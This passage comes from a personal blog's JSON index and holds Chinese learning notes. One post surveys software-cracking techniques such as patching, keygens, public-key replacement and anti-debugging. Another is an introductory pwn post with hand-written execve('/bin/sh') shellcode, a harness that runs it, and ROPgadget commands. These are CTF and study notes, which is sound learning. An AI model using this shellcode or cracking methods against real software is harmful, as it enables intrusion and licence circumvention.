12345678gets()system()&lt;buf&gt;&lt;buf&gt;","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]},{"title":"软件保护/软件破解 及对抗","slug":"软件保护-软件破解-及对抗","date":"2018-08-25T01:30:41.000Z","updated":"2018-08-25T11:15:33.954Z","comments":true,"path":"2018/08/25/软件保护-软件破解-及对抗/","link":"","permalink":"http://siriuswhiter.tk/2018/08/25/软件保护-软件破解-及对抗/","excerpt":"","text":"软件保护简单算法注册保护：输入用户名序列号，计算并检测序列号； 简单算法注册保护的对抗：①修改关键指令：暴力破解；patcher②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机③还原本身算法；keygen 复杂算法注册保护：通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等； 复杂算法注册保护的对抗：①patch②补丁修改公钥，使用自己的公钥对； 网络加密及硬件加密：本质上与本地加密相同/运行前检测？？ 网络加密及硬件加密的对抗：①patch②模拟与远程端的通信，及模拟执行；③使用中转程序，从服务器获得远程执行结果； 复杂系统注册保护：以上内容混杂 附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测 软件破解及对抗程序分析及对抗： 代码变形mutation； 代码膨胀expansion； 花指令； 代码乱序； 平坦化； 程序调试及对抗： 系统API检测程序是否处于被调试状态； 检测调试器窗口信息、状态码； 检测调试器驱动，符号； 程序执行行为检测（如检测运行时间，时间较长则处于被调试状态）； 利用驱动接管本身程序的中断，阻止被调试器接管； 利用驱动修改内核参数，阻止程序被调试； 双进程反调试； 程序修改及对抗：修改：文件补丁技术及工具；对抗修改： hash校验/内存关键部分CRC校验/ipk劫持等； dnspy：.NET程序逆向工具","categories":[],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"hexo essay writing","slug":"hexo-essay-writing","date":"2018-08-15T15:33:24.000Z","updated":"2018-08-25T02:04:13.859Z","comments":true,"path":"2018/08/15/hexo-essay-writing/","link":"","permalink":"http://siriuswhiter.tk/2018/08/15/hexo-essay-writing/","excerpt":"","text":"打开git,进入MyBlog目录； 输入 hexo new &quot;essay-name&quot;； 打开source文件夹，找到 essay-name.md，使用markdown语法写作； 执行命令 / hexo clean / hexo generate/ hexo deploy； over； 假如hexo命令出现问题，基本上就是_config.yml 文件的空格有问题，看报错就好了。","categories":[],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"markdown规范学习","slug":"markdown规范学习","date":"2018-08-13T14:46:46.000Z","updated":"2018-08-24T05:18:29.983Z","comments":true,"path":"2018/08/13/markdown规范学习/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/markdown规范学习/","excerpt":"","text":"MarkDown v1.01.1 全局规范 MarkDown 文件使用‘.md’结尾 （小写字母) 格式规范标题结构格式1.标题与紧贴的’上下正文‘使用’1整行换行‘隔开2.’#’号和文字之间’一个空格’连接3.标题层级最多六级 ‘#’到’######’ 加强和强调规范一般统一使用第一种 12*emphasize*_emphasize_ 使用’~~’给文字添加删除线1~~strikethrough~~ 代码块规范 行内代码使用’一对波浪号’如：hello world! 块级代码使用’三个波浪号’或’整体四空格缩进’，且上下均用整行隔开，如下： 123&lt;?php echo &apos;看源码之三个波浪号&apos;;?&gt; &lt;?php echo &apos;看源码之四空格缩进&apos;; ?&gt; 列表写法 列号’1.’或者’*’后内容用空格隔开 列表块前后’整行隔开’ 如下： 1234561. Windows 2. Mac3. iOS * iPhone * iPad4. Android 实际预览： Windows Mac iOS iPhone iPad Android 123456* Windows * Mac* iOS* Android 1. v3.2 2. v4.1 实际预览： Windows Mac iOS Android v3.2 v4.1 其他标签规范链接和email Inline： 1An [example](http://url.com/ &quot;title&quot;) 实现效果：An example 引用样式标签（titles are optional）: An [example][id].Then,anywhere else in the doc,define the link: [id]:http://example.com/ &quot;title&quot; Email: 1An email &lt;example@example.com&gt; link. 插图Inline(titles are optional)： 1![alt text](/path/img.jpg &quot;title&quot;) 引用式插图： ![alt text][id] [id]:/url/to/img.jpg &quot;title&quot; 引用块及嵌套 Email-style angle bracketsare used for blockquotes. And, they can be nested. Headers in blockquotes You can quote a list. Etc. 内联代码 &lt;code&gt; 段落中的用法 也可以 `代码中包含波浪号`.代码块 Indent every line of a code block by at least 4 spaces or 1 tab.代码的每行都最少用4个空格或者一个制表符(tab) 我是普通文本块 我是一个预格式化的 代码块. 水平分割线三个连字符-: 表格规范一个简单的表格看起来如下： 第一个头部 第二个头部 第三个头部 内容格子 内容格子 内容格子 内容格子 内容格子 内容格子 每列的对齐可以通过在分割线上添加冒号来实现： 第一个头部 第二个头部 第三个头部 左对齐 居中 右对齐 左对齐 居中 右对齐 页内锚标记 点我跳转到顶部 // 利用 #,## 生成 id 锚标签 另一种锚标记 // 利用 &lt;a name=&quot;top&quot;&gt;&lt;/a&gt; 附：参考 Hello-World.md 源码，注意换行的使用 123456789101112131415# Hello-World这是一个范例文件格式我是普通换行## 我是&lt;h2&gt;标题我是`&lt;h2&gt;`的内容## 我是&lt;h3&gt;标题* Windows * Mac* iOS* Android","categories":[],"tags":[{"name":"skills","slug":"skills","permalink":"http://siriuswhiter.tk/tags/skills/"}]},{"title":"pwn 入门1.1","slug":"pwn-入门1-1","date":"2018-08-13T14:35:13.000Z","updated":"2018-09-11T03:33:42.581Z","comments":true,"path":"2018/08/13/pwn-入门1-1/","link":"","permalink":"http://siriuswhiter.tk/2018/08/13/pwn-入门1-1/","excerpt":"","text":"各种变量的存储位置 stack：局部变量 heap: 动态分配内存的变量（malloc/new） bss section: 全局化的未初始化的变量 data section: 全局化的已初始化的变量 rodata: （只读data段）全局化的静态变量（const） 例如： 123456789int a = 0; //.dataint b; //.bssconst double PI = 3.1415 //rodataint main()&#123; int c = 2; //stack char *d = malloc(16); //heap return 0;&#125; linux下将shellcode运行1.手写简易shellcode 123456789101112jmp shrun: pop ebx mov BYTE [ebx+7],0 xor eax,eax mov al,11 xor ecx,ecx xor edx,edx int 0x80sh: call run db &quot;/bin/sh&quot; 2.一系列步骤 123Assembly: nasm a.asm -o a.o -felf32 Extract Shellcode: objcopy -O binary a.o code //将a.o中需要用内容的提取到code中 xxd -i code //将提取出来的code转换为机器码 3.带入调用shellcode的程序test.c #include &quot;code.h&quot; typedef int(*CODE)(); int main() { ((CODE)shellcode)(); } Run Shellcode: gcc test.c -o test -m32 -zexexstack syscalls.kernelgrok.com linux下的系统调用. 之前的一些小知识点笔记：gadget :一小段以ret结尾的code rop chain ：串联在一起的gadget rop 类型：控制寄存器做syscall；使用原有程序的func；使用libc里的gadget或func（绕过ASLR）. rop关键： 查找gadget： ROPgadget --binary ./file ROPgadget --binary --opcode cd80c3（int 0x80 ; ret ） 排列gadget： peda：vmmap 查看程序段的可读写执行情况 也可以：./file &amp; (后台运行，返回pid0） cat /proc/pid0/maps","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"}]}]}